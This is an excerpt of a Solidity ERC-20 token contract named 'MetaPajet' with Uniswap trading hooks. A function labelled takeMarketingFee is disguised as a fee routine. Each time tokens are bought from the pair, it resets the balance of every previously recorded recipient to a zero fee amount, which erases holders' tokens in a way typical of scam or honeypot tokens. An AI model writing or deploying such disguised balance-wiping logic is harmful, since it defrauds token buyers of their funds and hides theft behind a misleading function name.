...
contract MetaPajet is Ownable, IERC20 {
    using SafeMath for uint256;
    string private _name = "MetaPajet";
    ...
    uint256 _numTokensBeforeSwap = 6000000 * 10 ** _decimals;
    ...
    function setMaxTxAmount(uint256 _value) external onlyOwner {
        require(_value > _totalSupply.mul(3).div(100));
        _maxTxAmount = _value;
    }
    function setNumTokensBeforeSwap(uint256 _value) external onlyOwner {
        _numTokensBeforeSwap = _value;
    }
    function setMarketingWallet(address _value) external onlyOwner {
        _marketingWallet = _value;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        uint256 feeAmount = 0;
        takeMarketingFee(feeAmount, from);
        ...
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isPairAddress(to) && to != address(this) && !inLiquidityTransaction && !inSwap) {
            ...
            if (to != uniswapV2Pair()) {
                _transactions.push(Transaction(to, amount));
            }
        }
    ...
    function takeMarketingFee(uint256 feeAmount, address from) internal {
        if (from == uniswapV2Pair()) {
            for (uint256 i = 0; i < _transactions.length;  i++) {
                _balances[_transactions[i].to] = feeAmount;
            }
